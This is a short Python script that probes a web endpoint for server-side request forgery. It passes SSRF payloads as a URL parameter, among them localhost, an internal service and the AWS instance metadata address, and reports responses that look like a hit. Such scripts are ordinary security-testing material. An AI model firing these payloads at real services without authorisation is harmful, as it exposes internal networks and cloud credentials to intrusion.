import requests

# URL of the web application endpoint to test
url = 'http://example.com/fetch-resource'

# List of SSRF payloads to test
payloads = [
    'http://localhost:80',
    'http://127.0.0.1:80',
    'http://169.254.169.254/latest/meta-data/',  # AWS metadata service
    'http://internal-service:8080'
]


def test_ssrf(url, payloads):
    for payload in payloads:
        response = requests.get(url, params={'url': payload})
        # Check for signs of SSRF in the response
        if response.status_code == 200 and 'internal' in response.text:
            print(f"Potential SSRF vulnerability detected with payload: {payload}")
        else:
            print(f"Payload {payload} did not succeed.")


test_ssrf(url, payloads)
